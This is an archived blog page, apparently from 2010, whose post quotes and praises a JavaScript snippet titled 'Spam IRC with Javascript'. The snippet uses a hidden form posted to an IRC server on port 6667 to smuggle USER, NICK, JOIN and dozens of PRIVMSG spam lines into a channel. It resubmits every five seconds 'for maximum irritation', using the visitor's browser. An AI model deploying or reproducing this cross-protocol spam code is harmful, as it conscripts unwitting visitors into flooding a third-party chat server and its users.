@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html">
+  <head>
+    <title>Spam IRC with Javascript - Est's Blog</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+
+    <meta charset="utf-8" />
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="Est's Blog RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Spam IRC with Javascript" />
+
+
+
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="single-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    Est's Blog
+  </a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+
+        <li><a href="/category/archive.html" class="hamburger-menu-overlay-link active">archive</a></li>
+        <li><a href="/category/stderr.html" class="hamburger-menu-overlay-link">stderr</a></li>
+        <li><a href="/category/stdin.html" class="hamburger-menu-overlay-link">stdin</a></li>
+        <li><a href="/category/stdout.html" class="hamburger-menu-overlay-link">stdout</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="content side-text-padding">
+
+
+<article class="post">
+  <header class="post-header">
+    <h2 class="post-title">Spam IRC with Javascript</h2>
+    <p class="post-date">Posted <time datetime="2010-01-28T01:05:20+00:00">2010-01-28</time> | <span>archive</span></p>
+  </header>
+
+  
+  <pre><code>&lt;form method=&quot;post&quot; target=&quot;y&quot; action=&quot;http://irc.freenode.net:6667/&quot; enctype=&quot;text/plain&quot; id=&quot;f&quot; style=&quot;display:none&quot;&gt;
+    &lt;textarea name=&quot;x&quot; id=&quot;x&quot;&gt;&lt;/textarea&gt;
+&lt;/form&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    /* 
+     * Generate a random string of characters to use for an IRC nick
+     */
+    function rnd(){
+        var chars=&quot;abcdefghijklmnopqrstuvwxyz&quot;;
+        var r=&#39;&#39;;
+        var length=Math.floor(Math.random()*10+3);
+        for (var i=0;i&lt;length;i++){
+            var rnum=Math.floor(Math.random() * chars.length);
+            r += chars.substring(rnum, rnum+1);
+        }
+        return r;
+    }
+    function lol(){
+        /* Grab a reference to the textarea */
+        var x = document.getElementById(&#39;x&#39;);
+        /* Grab a reference to the form itself */
+        var f = document.getElementById(&#39;f&#39;);
+        /* Generate a fake user-name */
+        var i = rnd();
+        /* Generate a fake nick */
+        var n = rnd();
+
+        /* 
+         * Build a series of IRC commands into a string:
+         *   - Set the username
+         *   - Set the nick 
+         *   - Join the channel to spam (#redditdowntime)
+         *   - Queue up a bunch of PRIVMSG commands to the channel with the spam link
+         */
+        x.value=&#39;\r\nUSER &#39;+i+&#39; 8 * :&#39;+n+&#39;\r\nNICK &#39;+n+&#39;\r\nJOIN #redditdowntime\r\n&#39;+new Array(99).join(&#39;PRIVMSG #redditdowntime :http://bit.ly/lolreddit\r\n&#39;)+&#39;&#39;;
+
+        /* Submit the form, effectively sending the textarea contents to an IRC server */
+        f.submit();
+
+        /* Setup a loop for maximum irritation */
+        setTimeout(lol, 5000);
+    }
+    lol();
+&lt;/script&gt;
+&lt;h1&gt;DIGG ROOLZ! REDDIT DROOLZ!&lt;/h1&gt;
+</code></pre>
+
+<p>This is the most clever bits of JavaScript I think I’ve seen in recent months.</p>
+
+<p><a href="http://www.reddit.com/r/programming/comments/auog9/using_a_browser_to_piss_off_irc_users_or_spamming/">via</a></p>
+
+</article>
+
+
+<div class="comments">
+  <h2>Comments</h2>
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+    var disqus_shortname = 'estblog';
+    var disqus_identifier = 'archives/874';
+    var disqus_url = location.href;
+    (function() {
+    var dsq = document.createElement('script'); 
+
+    dsq.type = 'text/javascript';
+    dsq.defer = true;
+    dsq.src = '//estblog.disqus.com/embed.js';
+    (document.getElementsByTagName('body')[0] || document.getElementsByTagName('head')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the comments.</noscript>
+</div>    </main>
+<script src="/theme/js/core.js"></script>
+<script type="text/javascript">
+    if(location.protocol === "http:") location.protocol = "https:"
+</script>
+
+  </body>
+
+</html>
